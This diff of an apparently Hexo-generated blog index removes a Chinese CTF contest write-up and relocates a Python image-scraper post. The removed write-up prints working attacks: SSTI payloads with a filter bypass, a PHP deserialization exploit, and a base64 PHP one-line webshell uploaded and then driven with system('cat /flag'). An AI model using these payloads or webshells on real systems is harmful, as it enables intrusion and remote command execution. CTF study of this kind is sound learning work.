     <content><![CDATA[<h1 id="xss和sql注入简单环境的搭建"><a href="#xss和sql注入简单环境的搭建" class="headerlink" title="xss和sql注入简单环境的搭建"></a>xss和sql注入简单环境的搭建</h1><p>以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache</p>
@@ -4703,121 +4820,6 @@ $_POST    &amp;&amp; SafeFilter($_POST);
       </tags>
   </entry>
   <entry>
-    <title>cumt华为杯</title>
-    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
-    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
-<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
-<p>就是了模板注入</p>
-<pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre>
-
-<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
-<pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
-查看模块时，发现存在waf
-经过测试发现是过滤了[]
-于是使用
-&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
-存在file模块
-用read读取文件内容
-<span class="hljs-built_in">exp</span>:
-<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre>
-
-<p>参考链接：<a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
-<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
-<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" alt="cms.png"></a></p>
-<p>这里给出大神的做法</p>
-<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" alt="cms1.png"></a></p>
-<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
-<p>看到WP是大S绕过，涨知识了</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
-    &#125;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
-    <span class="hljs-comment">//echo $str;</span>
-    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
-    &#125;
-    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
-&#125;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
-    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
-    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;
-
-    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
-    <span class="hljs-keyword">exit</span>;
-&#125;
-<span class="hljs-variable">$todos</span> = [];
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
-    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
-        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
-        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
-        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
-            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
-        &#125;
-    &#125;
-&#125;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;
-    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];
-
-    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
-    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
-    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);
-
-    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
-    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
-    <span class="hljs-keyword">exit</span>;
-&#125;
-<span class="hljs-comment">// flag is in flag.php</span>
-?Copy</code></pre>
-
-<p>exp</p>
-<pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
-&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
-echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
-&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre>
-
-<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" alt="hodor.png"></a></p>
-<p>参考</p>
-<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
-<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
-<p>漏洞点在图片中上传图片的位置</p>
-<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" alt="webcms.png"></a></p>
-<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
-<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" alt="webcms2.png"></a></p>
-<blockquote>
-<p>1.filetype规定了文件的类型</p>
-<p>2.上传时，将图片保存为了base64形式</p>
-<p>所以上传一句话木马的时候要注意修改对应的位置</p>
-</blockquote>
-<p>一句话木马类型为php,则filetype改为php</p>
-<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
-<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" alt="webcms3.png"></a></p>
-<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
-<pre><code class="hljs css">POST:
-cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);
-或者蚁剑连接，密码cmdCopy</code></pre>
-
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
-<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
-<p>直接在文件里搜索就能到flag</p>
-<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>unserialize</tag>
-        <tag>ssti</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>木马</title>
     <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
     <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
@@ -4836,6 +4838,56 @@ cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ca
       <categories>
         <category>木马</category>
       </categories>
+  </entry>
+  <entry>
+    <title>爬图</title>
+    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
+    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><span id="more"></span>
+<p><strong>用的库</strong></p>
+<pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
+requests <span class="hljs-comment">#url请求</span>
+<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
+os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre>
+<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
+<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
+<span class="hljs-comment">#@Author : sunzy</span>
+<span class="hljs-comment">#@File : tupian.py</span>
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> os
+
+<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;plmm&quot;</span>        <span class="hljs-comment">#文件夹名字</span>
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
+    os.mkdir(<span class="hljs-built_in">dir</span>)
+<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
+head = &#123;
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
+    &#125;
+
+url = <span class="hljs-string">&quot;https://www.vmgirls.com/13344.html&quot;</span>
+response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
+html = response.text
+
+findlinks = <span class="hljs-string">&#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;</span>
+urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>
+
+<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
+    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
+    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    <span class="hljs-comment">#保存图片的名字</span>
+
+    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
+        f.write(res.content)</code></pre>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>爬虫</tag>
+      </tags>
   </entry>
   <entry>
     <title>算法上机复习</title>
@@ -5343,56 +5395,6 @@ E#---
       <categories>
         <category>c++</category>
       </categories>
-  </entry>
-  <entry>
-    <title>爬图</title>
-    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
-    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><span id="more"></span>
-<p><strong>用的库</strong></p>
-<pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
-requests <span class="hljs-comment">#url请求</span>
-<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
-os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre>
-<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
-<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
-<span class="hljs-comment">#@Author : sunzy</span>
-<span class="hljs-comment">#@File : tupian.py</span>
-<span class="hljs-keyword">import</span> re
-<span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
-<span class="hljs-keyword">import</span> os
-
-<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;plmm&quot;</span>        <span class="hljs-comment">#文件夹名字</span>
-<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
-    os.mkdir(<span class="hljs-built_in">dir</span>)
-<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
-head = &#123;
-        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
-    &#125;
-
-url = <span class="hljs-string">&quot;https://www.vmgirls.com/13344.html&quot;</span>
-response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
-html = response.text
-
-findlinks = <span class="hljs-string">&#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;</span>
-urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>
-
-<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
-    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
-    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    <span class="hljs-comment">#保存图片的名字</span>
-
-    res = requests.get(url, headers = head)   <span class="hljs-comment">#依此访问图片链接</span>
-    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#以二进制形式保存图片</span>
-        f.write(res.content)</code></pre>
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-      </tags>
   </entry>
   <entry>
     <title>综合2</title>
